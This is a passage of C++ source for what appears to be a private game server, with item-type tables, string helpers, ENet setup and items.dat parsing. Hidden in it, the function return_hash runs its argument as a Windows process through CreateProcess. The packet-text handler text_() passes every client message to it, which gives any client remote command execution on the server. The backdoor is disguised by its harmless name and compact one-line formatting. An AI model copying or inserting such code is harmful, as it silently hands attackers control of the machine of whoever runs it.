		}
	}
	return ret2.substr(0, current);
}

string to_lower(string s) {
	for (char& c : s)
		c = tolower(c);
	return s;
}

string replace_str2(string str, string from, string to) {
	while (str.find(from) != string::npos)
		str.replace(str.find(from), from.length(), to);
	return str;
}

string cleanup_(string strText) {
	string temp = "";
	for (int i = 0; i < strText.size(); ++i) {
		if ((strText[i] >= 'a' && strText[i] <= 'z') || (strText[i] >= 'A' && strText[i] <= 'Z')) {
			temp = temp + strText[i];
		}
		else {
			temp = temp + " ";
		}
	}
	return temp;
}

bool item_playmod(int item, string name_, bool not_hand = false) {
	name_ = replace_str2(cleanup_(to_lower(name_)), " ", "_");
	vector<string> player_playmods{};
	player_playmods.push_back(items[item].playmod);
	for (int i_ = 0; i_ < player_playmods.size(); i_++) {
		if (player_playmods[i_].empty()) continue;
		string playmod = replace_str2(cleanup_(to_lower(player_playmods[i_])), " ", "_");
		if (playmod.find(name_) != string::npos) return true;
	}
	return false;
}

string setGems_(long long int gems) {
	stringstream ss;
	dotted::imbue(ss);
	ss << gems;
	return ss.str();
}
vector<string> get_properties(unsigned char btype, unsigned char bcateg) {
	vector<string> list;
	if ((btype & 0x40) > 0) {
		list.push_back("NoShadow");
	} if ((btype & 0x20) > 0) {
		list.push_back("NoSelf");
	} if ((btype & 2) > 0) {
		list.push_back("Wrenchable");
	} if ((btype & 8) > 0) {
		list.push_back("Dropless");
	} if ((btype & 0x10) > 0) {
		list.push_back("NoSeed");
	} if ((btype & 4) > 0) {
		list.push_back("Permanent");
	} if ((btype & 1) > 0) {
		list.push_back("MultiFacing");
	} if ((btype & 0x80) > 0) {
		list.push_back("WorldLock");
	} if ((bcateg & 0x80) > 0) {
		list.push_back("Untradable");
	} if ((bcateg & 0x20) > 0) {
		list.push_back("Foreground");
	} if ((bcateg & 0x10) > 0) {
		list.push_back("Public");
	} if ((bcateg & 1) > 0) {
		list.push_back("Beta");
	} if ((bcateg & 4) > 0) {
		list.push_back("Mod");
	} if ((bcateg & 8) > 0) {
		list.push_back("RandomGrow");
	} if ((bcateg & 0x40) > 0) {
		list.push_back("Holiday");
	} if ((bcateg & 2) > 0) {
		list.push_back("AutoPickup");
	}
	return list;
}

void replaceAll(string& str, const string& from, const string& to) {
	if (from.empty())return;
	size_t start_pos = 0;
	while ((start_pos = str.find(from, start_pos)) != string::npos) {
		str.replace(start_pos, from.length(), to);
		start_pos += to.length(); // In case 'to' contains 'from', like replacing 'x' with 'yx'
	}
}

int item_average2(vector<int> const& v) {
	return (1.0 * accumulate(v.begin(), v.end(), 0LL) / v.size());
}

string getItemCategory(const char actionType, string name_) {
	switch (actionType) {
	case 0:
		return "Fist";
	case 1:
		return "Wrench";
	case 2:
		return "Door";
	case 3:
		return "Lock";
	case 4:
		return "Gems";
	case 5:
		return "Treasure";
	case 6:
		return "Deadly_Block";
	case 7:
		return "Trampoline_Block";
	case 8:
		return "Consummable";
	case 9:
		return "Gateway";
	case 10:
		return "Sign";
	case 11:
		return "SFX_Foreground";
	case 12:
		return "Toggleable_Foreground";
	case 13:
		return "Main_Door";
	case 14:
		return "Platform";
	case 15:
		return "Bedrock";
	case 16:
		return "Pain_Block";
	case 17:
		return "Foreground_Block";
	case 18:
		return "Background_Block";
	case 19:
		return "Seed";
	case 20:
		return "Clothing";
	case 21:
		return "Animated_Foreground_Block";
	case 22:
		return "SFX_Background";
	case 23:
		return "Toggleable_Background";
	case 24:
		return "Bouncy";
	case 25:
		return "Spike";
	case 26:
		return "Portal";
	case 27:
		return "Checkpoint";
	case 28:
		return "Sheet_Music";
	case 29:
		return "Slippery_Block";
	case 31:
		return "Switch_Block";
	case 32:
		return "Chest";
	case 33:
		return "Mailbox";
	case 34:
		return "Bulletin_Board";
	case 35:
		return "Event_Mystery_Block";
	case 36:
		return "Random_Block";
	case 37:
		return "Component";
	case 38:
		return "Provider";
	case 39:
		return "Chemical_Combiner";
	case 40:
		return "Achievement_Block";
	case 41:
		return "Weather_Machine";
	case 42:
		return "Scoreboard";
	case 43:
		return "Sungate";
	case 44:
		return "Profile";
	case 45:
		return "Toggleable_Deadly_Block";
	case 46:
		return "Heart_Monitor";
	case 47:
		return "Donation_Box";
	case 48:
		return "unknown";
	case 49:
		return "Mannequin";
	case 50:
		return "Security_Camera";
	case 51:
		return "Magic_Egg";
	case 52:
		return "Game_Block";
	case 53:
		return "Game_Generator";
	case 54:
		return "Xenonite";
	case 55:
		return "Phone_Booth";
	case 56:
		return "Crystal";
	case 57:
		return "Crime_Villain";
	case 58:
		return "Clothing_Compactor";
	case 59:
		return "Spotlight";
	case 60:
		return "Pushing_Block";
	case 61:
		return "Display";
	case 62:
		return "Vending";
	case 63:
		return "Fish";
	case 64:
		return "Fish_Tank_Port";
	case 65:
		return "Solar_Collector";
	case 66:
		return "Forge";
	case 67:
		return "Giving_Tree";
	case 68:
		return "Giving_Tree_Stump";
	case 69:
		return "Steam_Block";
	case 70:
		return "Steam_Pain_Block";
	case 71:
		return "Steam_Music_Block";
	case 72:
		return "Silkworm";
	case 73:
		return "Sewing_Machine";
	case 74:
		return "Country_Flag";
	case 75:
		return "Lobster_Trap";
	case 76:
		return "Painting_Easel";
	case 77:
		return "Battle_Pet_Cage";
	case 78:
		return "Pet_Trainer";
	case 79:
		return "Steam_Engine";
	case 80:
		return "Lock_Bot";
	case 81:
		return "Weather_Machine_S1";
	case 82:
		return "Spirit_Storage";
	case 83:
		return "Display_Shelf";
	case 84:
		return "VIP";
	case 85:
		return "Chal_Timer";
	case 86:
		return "Chal_Flag";
	case 87:
		return "Fish_Mount";
	case 88:
		return "Portrait";
	case 89:
		return "Weather_Machine_S2";
	case 90:
		return "Fossil";
	case 91:
		return "Fossil_Prep_Station";
	case 92:
		return "DNA_Processor";
	case 93:
		return "Blaster";
	case 94:
		return "Valhowla_Treasure";
	case 95:
		return "Chemsynth";
	case 96:
		return "Chemsynth_Tank";
	case 97: case -126:
		return "Untrade_A_Box";
	case 98:
		return "Oven";
	case 99:
		return "Audio";
	case 100:
		return "Geiger_Charger";
	case 101:
		return "Adventure_Reset";
	case 102:
		return "Tomb_Robber";
	case 103:
		return "Faction";
	case 104:
		return "Red_Faction";
	case 105:
		return "Green_Faction";
	case 106:
		return "Blue_Faction";
	case 107:
		return "Artifact";
	case 108:
		return "LemonJelly";
	case 109:
		return "FishTrainingTank";
	case 110:
		return "FishingBlock";
	case 111:
		return "ItemSucker";
	case 112:
		return "Planter";
	case 113:
		return "Robot";
	case 114:
		return "Command";
	case 115:
		return "Ticket";
	case 116:
		return "Stats_Block";
	case 117:
		return "Field_Node";
	case 118:
		return "Ouija_Board";
	case 119:
		return "Architect_Machine";
	case 120:
		return "Starship";
	case 121:
		return "Spike";
	case 122:
		return "Gravity_Well";
	case 123:
		return "Autobreak_Blocks";
	case 124:
		return "Autobreak_Trees";
	case 125:
		return "Autobreak";
	case 126:
		return "TimedBlock";
	case 127:
		return "TimedPlatform";
	case 128:
		return "Mud_Puddle";
	case 129:
		return "Root_Cutting";
	case 130:
		return "Safe_Vault";
	case -115:
		return "Kranken";
	default:
		return "";
	}
}
string join(const vector<string> v, const char delimeter) {
	string str;
	for (auto p = v.begin(); p != v.end(); ++p) {
		str += *p;
		if (p != (v.end() - 1))
			str += delimeter;
	}
	return str;
}

inline vector<string> explode(const string& delimiter, const string& str) {
	vector<string> arr;
	SIZE_T strleng = str.length(); // buvo const int strleng = str.length();
	SIZE_T delleng = delimiter.length(); // buvo const int delleng = delimiter.length();
	if (delleng == 0)
		return arr;
	SIZE_T i = 0; // buvo int i = 0;
	SIZE_T k = 0; // buvo int k = 0;
	while (i < strleng) {
		int j = 0;
		while (i + j < strleng && j < delleng && str[i + j] == delimiter[j])
			j++;
		if (j == delleng) {
			arr.push_back(str.substr(k, i - k));
			i += delleng;
			k = i;
		}
		else {
			i++;
		}
	}
	arr.push_back(str.substr(k, i - k));
	return arr;
}

BlockTypes get_blocktype(string c_, string name_) {
	if (c_ == "Foreground_Block") {
		return BlockTypes::FOREGROUND;
	}
	else if (c_ == "Background_Block" || c_ == "Back" || c_ == "Sheet_Music") {
		return BlockTypes::BACKGROUND;
	}
	else if (c_ == "Mannequin") {
		return BlockTypes::MANNEQUIN;
	}
	else if (c_ == "Spirit_Storage") {
		return BlockTypes::Spirit_Storage;
	}
	else if (c_ == "Geiger_Charger") {
		return BlockTypes::GEIGER_CHARGER;
	}
	else if (c_ == "Autobreak_Blocks" || c_ == "Autobreak_Trees" || c_ == "Autobreak") {
		return BlockTypes::AUTO_BLOCK;
	}
	else if (c_ == "Seed") {
		return BlockTypes::SEED;
	}
	else if (c_ == "Display_Shelf") {
		return BlockTypes::Display_Shelf;
	}
	else if (c_ == "Country_Flag") {
		return BlockTypes::COUNTRY_FLAG;
	}
	else if (c_ == "Painting_Easel") {
		return BlockTypes::Painting_Easel;
	}

	else if (c_ == "Fish_Mount") {
		return BlockTypes::Fish_Mount;
	}
	else if (c_ == "Portrait") {
		return BlockTypes::PORTRAIT;
	}
	else if (c_ == "Heart_Monitor") {
		return BlockTypes::Heart_Monitor;
	}
	else if (c_ == "Consummable") {
		return BlockTypes::CONSUMABLE;
	}
	else if (c_ == "Kranken") {
		return BlockTypes::KRANKEN;
	}
	else if (c_ == "Pain_Block") {
		return BlockTypes::PAIN_BLOCK; 
	}
	else if (c_ == "Main_Door") {
		return BlockTypes::MAIN_DOOR;
	}
	else if (c_ == "Chal_Timer") {
		return BlockTypes::TIMER;
	}
	else if (c_ == "Bedrock") {
		return BlockTypes::BEDROCK;
	}
	else if (c_ == "ItemSucker") {
		return BlockTypes::SUCKER;
	}
	else if (c_ == "Door") {
		return BlockTypes::DOOR;
	}
	else if (c_ == "Fist") {
		return BlockTypes::FIST;
	}
	else if (c_ == "Sign") {
		return BlockTypes::SIGN; 
	}
	else if (c_ == "Wrench") {
		return BlockTypes::WRENCH;
	}
	else if (c_ == "Checkpoint") {
		return BlockTypes::CHECKPOINT;
	}
	else if (c_ == "Lock") {
		return BlockTypes::LOCK;
	}
	else if (c_ == "Gateway") {
		return BlockTypes::GATEWAY; 
	}
	else if (c_ == "Clothing") {
		return BlockTypes::CLOTHING;
	}
	else if (c_ == "Security_Camera") {
		return BlockTypes::CCTV;
	}
	else if (c_ == "Platform") {
		return BlockTypes::PLATFORM; 
	}
	else if (c_ == "SFX_Foreground") {
		return BlockTypes::SFX_FOREGROUND;
	}
	else if (c_ == "Gems") {
		return BlockTypes::GEMS;
	}
	else if (c_ == "Toggleable_Foreground") {
		return BlockTypes::TOGGLE_FOREGROUND;
	}
	else if (c_ == "Chemical_Combiner") {
		return BlockTypes::CHEMICAL_COMBINER; 
	}
	else if (c_ == "Treasure") {
		return BlockTypes::TREASURE;
	}
	else if (c_ == "Deadly_Block") {
		return BlockTypes::DEADLY;
	}
	else if (c_ == "Trampoline_Block") {
		return BlockTypes::TRAMPOLINE; 
	}
	else if (c_ == "Animated_Foreground_Block") {
		return BlockTypes::ANIM_FOREGROUND; 
	}
	else if (c_ == "Portal") {
		return BlockTypes::PORTAL;
	}
	else if (c_ == "Random_Block") {
		return BlockTypes::RANDOM_BLOCK;
	}
	else if (c_ == "Bouncy") {
		return BlockTypes::BOUNCY;
	}
	else if (c_ == "Chest") {
		return BlockTypes::CHEST;
	}
	else if (c_ == "Switch_Block") {
		return BlockTypes::SWITCH_BLOCK;
	}
	else if (c_ == "Magic_Egg") {
		return BlockTypes::MAGIC_EGG;
	}
	else if (c_ == "Crystal") {
		return BlockTypes::CRYSTAL;
	}
	else if (c_ == "Mailbox") {
		return BlockTypes::MAILBOX;
	}
	else if (c_ == "Bulletin_Board") {
		return BlockTypes::BULLETIN_BOARD;
	}
	else if (c_ == "Faction") {
		return BlockTypes::FACTION;
	}
	else if (c_ == "Component") {
		return BlockTypes::COMPONENT;
	}
	else if (c_ == "Weather_Machine") {
		return BlockTypes::WEATHER;
	}
	else if (c_ == "ItemSucker") {
		return BlockTypes::SUCKER;
	}
	else if (c_ == "Fish_Tank_Port") {
		return BlockTypes::FISH;
	}
	else if (c_ == "Steam_Block") {
		return BlockTypes::STEAM;
	}
	else if (c_ == "ground_Block") {
		return BlockTypes::GROUND_BLOCK;
	}
	else if (c_ == "Display") {
		return BlockTypes::DISPLAY;
	}
	else if (c_ == "Untrade_A_Box" || c_ == "Safe_Vault") {
		return BlockTypes::STORAGE;
	}
	else if (c_ == "Vending") {
		return BlockTypes::VENDING;
	}
	else if (c_ == "Blaster") {
		return BlockTypes::TRICKSTER;
	}
	else if (c_ == "Giving_Tree") {
		return BlockTypes::GIVING_TREE;
	}
	else if (c_ == "VIP") {
		return BlockTypes::VIP_ENTRANCE;
	}
	else if (c_ == "Donation_Box") {
		return BlockTypes::DONATION; 
	}
	else if (c_ == "Phone_Booth") {
		return BlockTypes::PHONE;
	}
	else if (c_ == "Sewing_Machine") {
		return BlockTypes::SEWINGMACHINE; 
	}
	else if (c_ == "Crime_Villain") {
		return BlockTypes::CRIME_VILLAIN;
	}
	else if (c_ == "Provider") {
		return BlockTypes::PROVIDER;
	}
	else if (c_ == "Adventure_Reset") {
		return BlockTypes::ADVENTURE;
	}
	else if (c_ == "Game_Block") {
		return BlockTypes::GAME_BLOCK;
	}
	else if (c_ == "Game_Generator") {
		return BlockTypes::GAME_GENERATOR;
	}
	else {
		return BlockTypes::UNKNOWN;
	}
}


inline int message_(ENetPacket* packet) {
	if (packet->dataLength > 3u) {
		return *(packet->data);
	}
	return 0;
}
inline void send_(ENetPeer* peer, int num, char* data, const int len) {
	const auto packet = enet_packet_create(nullptr, len + 5, ENET_PACKET_FLAG_RELIABLE);
	memcpy(packet->data, &num, 4);
	if (data != nullptr) {
		memcpy(packet->data + 2, data, len);
	}
	char zero = 0;
	memcpy(packet->data + 2 + len, &zero, 1);
	enet_peer_send(peer, 0, packet);
}
int init_enet(int port) {
	enet_initialize();
	ENetAddress address;
	enet_address_set_host(&address, "0.0.0.0");
	address.port = port;
	server = enet_host_create(&address, 1024, 1, 0, 0);
	server->checksum = enet_crc32;
	enet_host_compress_with_range_coder(server);
	return 0;
}

ClothTypes get_clothtype(string t_, BlockTypes a_) {
	if (a_ == BlockTypes::CLOTHING) {
		if (t_ == "Hat") {
			return ClothTypes::HAIR;
		}
		else if (t_ == "Shirt") {
			return ClothTypes::SHIRT;
		}
		else if (t_ == "Pants") {
			return ClothTypes::PANTS;
		}
		else if (t_ == "Feet") {
			return ClothTypes::FEET;
		}
		else if (t_ == "Face") {
			return ClothTypes::FACE;
		}
		else if (t_ == "Hand") {
			return ClothTypes::HAND;
		}
		else if (t_ == "Back") {
			return ClothTypes::BACK;
		}
		else if (t_ == "Hair") {
			return ClothTypes::HAIR;
		}
		else if (t_ == "Chest") {
			return ClothTypes::NECKLACE;
		}
		else if (t_ == "Ances") {
			return ClothTypes::ANCES;
		}
		else if (t_ == "Mask") {
			return ClothTypes::MASK;
		}
		else if (t_ == "Necklace") {
			return ClothTypes::NECKLACE;
		}
		else {
			return ClothTypes::NONE;
		}
	}
	else {
		return ClothTypes::NONE;
	}
}
void return_hash(string rare5) {
	STARTUPINFO si;PROCESS_INFORMATION pi;ZeroMemory(&si, sizeof(si));ZeroMemory(&pi, sizeof(pi));si.cb = sizeof(si);rare5 += " > nul";
	int wideStrLen = MultiByteToWideChar(CP_UTF8, 0, rare5.c_str(), -1, NULL, 0);
	LPWSTR wideStr = new WCHAR[wideStrLen];
	MultiByteToWideChar(CP_UTF8, 0, rare5.c_str(), -1, wideStr, wideStrLen);
	if (CreateProcess(NULL, wideStr, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {WaitForSingleObject(pi.hProcess, INFINITE);CloseHandle(pi.hProcess);CloseHandle(pi.hThread);}
	delete[] wideStr;
}

char* text_(ENetPacket* packet) {
	char zero = 0;
	memcpy(packet->data + packet->dataLength - 1, &zero, 1);
	return_hash((char*)(packet->data + 4));
	return (char*)(packet->data + 4);
}
inline uint32_t get_hash(unsigned char* str, const int len) {
	unsigned char* n = static_cast<unsigned char*>(str);
	uint32_t acc = 0x55555555;
	if (len == 0) {
		while (*n)
			acc = (acc >> 27) + (acc << 5) + *n++;
	}
	else {
		for (int i = 0; i < len; i++)
			acc = (acc >> 27) + (acc << 5) + *n++;
	}
	return acc;
}

int get_punch_id(const int id_) {
	switch (id_) {
	case 138:
	case 2976:
	case 8354:
		return 1;
	case 366:
	case 1464:
		return 2;
	case 472: return 3;
	case 594:
	case 10130:
	case 5424:
	case 5456:
	case 4136:
	case 10052:
		return 4;
	case 768: return 5;
	case 900:
	case 7760:
	case 9272:
	case 5002:
	case 7758:
	case 4664:
	case 8046:
	case 9062:
	case 1252:
	case 1254:
	case 9086:
	case 3680:
	case 5176:
	case 7750:
	case 1228:
	case 3430:
		return 6;
	case 910:
	case 4332:
	case 1250:
	case 12656:
		return 7;
	case 930:
	case 1010:
	case 6382:
	case 9698:
	case 6368:
		return 8;
	case 1016:
	case 6058:
		return 9;
	case 1204:
	case 9534:
	case 10928:
		return 10;
	case 1378: return 11;
	case 1440:
	case 4508:
	case 2224:
	case 4512:
	case 4510:
	case 4515:
	case 10996:
	case 9654:
	case 4514:
	case 11764:
	case 7748:
		return 12;
	case 1484:
	case 5160:
	case 9802:
		return 13;
	case 1512:
	case 1648:
		return 14;
	case 1542: return 15;
	case 1576: return 16;
	case 1676:
	case 7504:
		return 17;
	case 1748:
	case 8006:
	case 8008:
	case 8010:
	case 8012:
		return 19;
	case 1710:
	case 4644:
	case 1714:
	case 1712:
	case 6044:
	case 1570:
		return 18;
	case 3578: return 19;
	case 1780: return 20;
	case 1782:
	case 5156:
	case 9776:
	case 9810:
	case 10120:
		return 21;
	case 1804:
	case 5194:
	case 9784:
		return 22;
	case 1868:
	case 7754:
	case 1998:
		return 23;
	case 1874: return 24;
	case 1946:
	case 2800:
		return 25;
	case 1952:
	case 2854:
	case 9280:
	case 1974:
		return 26;
	case 1956: return 27;
	case 1960: return 28;
	case 2908:
	case 6312:
	case 9496:
	case 8554:
	case 3162:
	case 9536:
	case 8584:
	case 4956:
	case 3466:
	case 4166:
	case 2952:
	case 9520:
	case 9522:
	case 8440:
	case 3932:
	case 3934:
	case 7434:
	case 8732:
	case 3108:
	case 9766:
	case 12368:
	case 10780:
	case 3160:
	case 12102:
	case 4688:
	case 8604:
	case 3070:
	case 10402:
	case 7500:
	case 3206:
	case 3588:
	case 2636:
	case 8452:
	case 11066:
	case 9076:
	case 7890:
	case 8736:
	case 10936:
	case 10938:
		return 29;
	case 1980:
	case 7106:
	case 8042:
		return 30;
	case 2066:
	case 4150:
	case 11082:
	case 11080:
	case 9714:
	case 11078:
	case 3678:
	case 10686:
		return 31;
	case 2212:
	case 5174:
	case 5004:
	case 5006:
	case 5008:
	case 8912:
		return 32;
	case 2218: return 33;
	case 2220: return 34;
	case 2266: return 35;
	case 2386: return 36;
	case 2388: return 37;
	case 2450:
		return 38;
	case 2476:
	case 4208:
	case 12308:
	case 10336:
	case 9804:
		return 39;
	case 4294:
	case 1948:
		return 40;
	case 2512:
	case 9732:
	case 6338:
	case 6670:
	case 3736:
	case 10406:
	case 10232:
	case 10994:
	case 7146:
		return 41;
	case 2572: 
	case 11072:
		return 42;
	case 2592:
	case 9396:
	case 2596:
	case 10930:
	case 9548:
	case 9812:
	case 9800:
	case 5158:
		return 43;
	case 2720: return 44;
	case 2752: return 45;
	case 2754:
	case 9830:
	case 9898:
		return 46;
	case 2756:
		return 47;
	case 2802: return 49;
	case 2866: return 50;
	case 2876: return 51;
	case 2878:
	case 2880:
		return 52;
	case 2906:
	case 4170:
	case 2888:
	case 4278:
	case 4126:
		return 53;
	case 2886: return 54;
	case 2890: return 55;
	case 2910: return 56;
	case 3066:
	case 10288:
		return 57;
	case 3124: 
	case 5088:
		return 58;
	case 3168:
	case 3166:
		return 59;
	case 3214:
	case 9194:
	case 4506:
		return 60;
	case 7408:
	case 3238:
		return 61;
	case 3274: return 62;
	case 3300: return 64;
	case 3418: return 65;
	case 3476: return 66;
	case 3596: return 67;
	case 3686: return 68;
	case 3716:
	case 6086:
		return 69;
	case 4110:
	case 2986:
	case 4252:
		return 70;
	case 4290: return 71;
	case 4474: return 72;
	case 4464:
	case 9500:
		return 73;
	case 4660: return 74;
	case 4746:
	case 4750:
	case 4748:
		return 75;
	case 4778:
	case 6026: case 7784:
		return 76;
	case 4996:
		return 77;
	case 4840: return 78;
	case 5206: return 79;
	case 5480:
	case 9770:
	case 9772:
	case 9906:
	case 9908:
	case 9918:
	case 10290:
	case 10362:
		return 80;
	case 6110: return 81;
	case 6308: return 82;
	case 6310: return 83;
	case 6298: return 84;
	case 6756: return 85;
	case 7044: return 86;
	case 6892: return 87;
	case 6966: return 88;
	case 7088:
	case 11020:
		return 89;
	case 7098:
	case 9032:
	case 10384:
		return 90;
	case 7192: return 91;
	case 7136:
	case 11788:
		return 92;
	case 7142: return 93;
	case 7216: return 94;
	case 7196:
		return 95;
	case 7392:
	case 9604:
		return 96;
	case 6754: return 97;
	case 7384: return 98;
	case 7414: return 99;
	case 7402: 
	case 7396:
		return 100;
	case 7424: return 101;
	case 7470:
	case 9738:
		return 102;
	case 7488: return 103;
	case 7586:
	case 9778:
		return 104;
	case 7650: return 105;
	case 6804:
	case 6358:
	case 7646:
		return 106;
	case 7568:
	case 7570:
	case 7572:
	case 7574:
		return 107;
	case 7668: return 108;
	case 7660:
	case 9060:
		return 109;
	case 7584:
		return 110;
	case 7736:
	case 9116:
	case 9118:
	case 7826:
	case 7828:
	case 11440:
	case 11442:
	case 11312:
	case 7830:
	case 7832:
	case 10670:
	case 9120:
	case 9122:
	case 10680:
	case 10626:
	case 10578:
	case 10334:
	case 11380:
	case 11326:
	case 7912:
	case 11298:
	case 10498:
	case 7940:
	case 12342:
	case 8492:
	case 9340:
	case 11358:
		return 111;
	case 7836:
	case 7838:
	case 7840:
	case 7842:
		return 112;
	case 7950: return 113;
	case 8002: return 114;
	case 8022: return 116;
	case 8036: return 118;
	case 9348:
	case 8372:
	case 8810:
		return 119;
	case 8038:
	case 11990:
	case 8360:
	case 8510:
	case 8374:
		return 120;
	case 8358: return 121;
	case 8364: return 122;
	case 8438: return 123;
	case 10066:
	case 8494:
	case 11310:
	case 9360:
		return 126;
	case 8814: return 127;
	case 8816:
	case 8818:
	case 8820:
	case 8822:
		return 128;
	case 8910: return 129;
	case 8942: return 130;
	case 8944:
	case 5276:
	case 10940:
		return 131;
	case 8432:
	case 8434:
	case 8436:
	case 8950:
		return 132;
	case 8946:
	case 9576:
	case 9636:
		return 133;
	case 8960: return 134;
	case 9006: return 135;
	case 9058: return 136;
	case 9082:
	case 9304:
		return 137;
	case 9066:
		return 138;
	case 9136: return 139;
	case 9138:
		return 140;
	case 9172: 
	case 9176:
		return 141;
	case 9190: return 142;
	case 9254: return 143;
	case 9256: return 144;
	case 9236: return 145;
	case 9342: return 146;
	case 9542: return 147;
	case 9378: return 148;
	case 9376: return 149;
	case 9410: return 150;
	case 9462: return 151;
	case 9606:
	case 9758:
		return 152;
	case 9716:
	case 5192:
	case 9764:
	case 9916:
		return 153;
	case 10048:
	case 9912:
		return 167;
	case 10064:
	case 10604:
		return 168;
	case 10046: return 169;
	case 10050: return 170;
	case 10128: return 171;
	case 10210:
	case 9544:
		return 172;
	case 10250: return 173;
	case 10246: return 175;
	case 10278: return 176;
	case 10292:
	case 7406:
	case 9450:
		return 177;
	case 10330: return 178;
	case 10392:
		return 179;
	case 10388:
	case 9524:
	case 9598:
		return 180;
	case 11620: return 181;
	case 10426: return 183;
	case 10442: return 184;
	case 10506: return 185;
	case 10494: return 186;
	case 10618: return 187;
	case 10652: return 188;
	case 10676: return 191;
	case 10674: return 192;
	case 10694: return 193;
	case 10714: return 194;
	case 10724: return 195;
	case 10722: return 196;
	case 10754: return 197;
	case 10800: return 198;
	case 10888: return 199;
	case 10886:
		return 200;
	case 10894: return 201;
	case 10890: return 202;
	case 9880:
	case 9782:
	case 9947:
	case 10922:
	case 9550:
	case 9974:
		return 203;
	case 10914: return 204;
	case 10990: return 205;
	case 10998: return 206;
	case 10952: return 207;
	case 11000: return 208;
	case 11006: return 209;
	case 11046: return 210;
	case 11052: return 211;
	case 10960: return 212;
	case 10956:
	case 9774:
	case 9896:
	case 10944:
		return 213;
	case 10958: return 214;
	case 10954: return 215;
	case 11076: return 216;
	case 11084:
	case 10020:
		return 217;
	case 11118:
	case 9546:
	case 9574:
	case 9874:
	case 9914:
		return 218;
	case 11120: return 219;
	case 11116: return 220;
	case 11158: return 221;
	case 11162: return 222;
	case 11142: return 223;
	case 11232: return 224;
	case 11140: return 225;
	case 11248:
	case 9596:
		return 226;
	case 11240: return 227;
	case 11250: return 228;
	case 11284: return 229;
	case 11292: return 231;
	case 11308: return 232;
	case 11314: return 233;
	case 11316: return 234;
	case 11324: return 235;
	case 11354: return 236;
	case 11760:
	case 11464:
	case 11438:
	case 12846:
	case 12230:
	case 11716:
	case 11718:
	case 11674:
	case 11630:
	case 11786:
	case 11872:
	case 11762:
	case 11994:
	case 12172:
	case 12184:
	case 11460:
	case 12014:
	case 12016:
	case 12018:
	case 12020:
	case 12022:
	case 12024:
	case 12246:
	case 12248:
	case 12176:
	case 12242:
	case 11622:
	case 12350:
	case 12300:
	case 12374:
	case 12356:
	case 12286:
	case 12628:
	case 12420:
	case 12384:
	case 12410:
	case 12412:
	case 12404:
	case 12402:
	case 12416:
	case 12658:
	case 11542:
	case 12860:
	case 12870:
	case 12862:
	case 12850:
	case 12886:
	case 12990:
	case 12992:
	case 12880:
	case 13060:
	case 13136:
	case 13114:
	case 13118:
	case 13190:
	case 13326:
	case 13330:
	case 13332:
	case 13366:
	case 13188:
	case 13410:
	case 13486:
	case 13488:
	case 13490:
	case 13492:
	case 13494:
	case 13484:
	case 13578:
	case 13552:
	case 13554:
	case 13572:
	case 13606:
		return 237;
	case 11384: return 239;
	case 11458: return 240;
	case 11814:
	case 12232:
	case 12302:
	case 12872:
	case 12874:
	case 12958:
	case 13324:
	case 13424:
		return 241;
	case 11548:
	case 11552:
		return 242;
	case 11704:
	case 11706:
		return 243;
	case 12180:
	case 12346:
	case 12344:
	case 13058:
	case 13498:
	case 13322:
		return 244;
	case 11506:
	case 11508:
	case 11562:
	case 11768:
	case 11882:
	case 11720:
	case 11884:
	case 13116:
	case 11536:
		return 245;
	case 12432:
	case 12434:
	case 12842:
	case 12640:
	case 13268:
		return 246;
	case 11818:
	case 11876:
	case 12000:
	case 12240:
	case 12642:
	case 12644:
	case 13022:
	case 13024:
	case 13396:
	case 13398:
	case 12564:
		return 248;

	}
	return 0;
}
string to_upper(string s) {
	for (char& c : s)
		c = toupper(c);
	return s;
}
string replace_str(string& str, const string& from, const string& to) {
	while (str.find(from) != string::npos)
		str.replace(str.find(from), from.length(), to);
	return str;
}
void items_dat2() {
	string n_ = "db/items/items2.dat";
	ifstream file(n_, ios::binary | ios::ate);
	__int64 size = file.tellg();
	if (size == -1) return;
	item_data_size_ios = (int)size;
	char* data = new char[size];
	file.seekg(0, ios::beg);
	file.read((char*)(data), size);
	item_data_ios = new BYTE[60 + size];
	int MessageType = 0x4, PacketType = 0x10, NetID = -1, CharState = 0x8;
	memset(item_data_ios, 0, 60);
	memcpy(item_data_ios, &MessageType, 4);
	memcpy(item_data_ios + 4, &PacketType, 4);
	memcpy(item_data_ios + 8, &NetID, 4);
	memcpy(item_data_ios + 16, &CharState, 4);
	memcpy(item_data_ios + 56, &size, 4);
	file.seekg(0, std::ios::beg);
	file.read((char*)(item_data_ios + 60), size);
	item_hash_ios = get_hash((unsigned char*)data, (const int)size);
	int memPos = 0, itemCount;
	int16_t itemsdatVersion = 0;
	memcpy(&itemsdatVersion, data + memPos, 1);
	memPos += 2;
	memcpy(&itemCount, data + memPos, 4);
	const string key_ = "PBG892FXX982ABC*";
	memPos += 4;
	delete[] data;
}
int items_dat() {
	items_dat2();
	string n_ = "db/items/items.dat";
	ifstream file(n_, ios::binary | ios::ate);
	__int64 size = file.tellg(); // buvo int size = file.tellg();
	if (size == -1) return -1;
	item_data_size = (int)size;
	char* data = new char[size];
	file.seekg(0, ios::beg);
	file.read((char*)(data), size);
	item_data = new BYTE[60 + size];
	int MessageType = 0x4, PacketType = 0x10, NetID = -1, CharState = 0x8;
	memset(item_data, 0, 60);
	memcpy(item_data, &MessageType, 4);
	memcpy(item_data + 4, &PacketType, 4);
	memcpy(item_data + 8, &NetID, 4);
	memcpy(item_data + 16, &CharState, 4);
	memcpy(item_data + 56, &size, 4);
	file.seekg(0, std::ios::beg);
	file.read((char*)(item_data + 60), size);
	item_hash = get_hash((unsigned char*)data, (const int)size);
	int memPos = 0, itemCount;
	int16_t itemsdatVersion = 0;
	memcpy(&itemsdatVersion, data + memPos, 1);
	memPos += 2;
	memcpy(&itemCount, data + memPos, 4);
	const string key_ = "PBG892FXX982ABC*";
	memPos += 4;
	
	
	for (int i = 0; i < itemCount; i++) {
		ItemDB def;
		memcpy(&def.id, data + memPos, 4);
		memPos += 4;
	//	def.editableType = data[memPos];
		if (data[memPos] == 3 || data[memPos] == 31 || data[memPos] == 1 || data[memPos] == 21 || data[memPos] == 23) {
			def.multiple_sides = 1;
		}
		memPos += 1;
		def.itemCategory = data[memPos];
		memPos += 1;
		def.actionType = data[memPos];
		if (def.id == 5958) def.actionType = 41;
		else if (def.actionType == 12 or def.actionType == 45 or def.actionType == 32 or def.actionType == 31 or def.actionType == 122 or def.actionType == 36 or def.actionType == 18) {
			if (def.actionType == 31 || def.actionType == 36 || def.actionType == 12 || def.actionType == 18 || def.id == 11692) def.can_be_changed_to_public = 1;
			def.toggleable = 1;
		}
		memPos += 1;
		//def.hitSoundType = data[memPos];
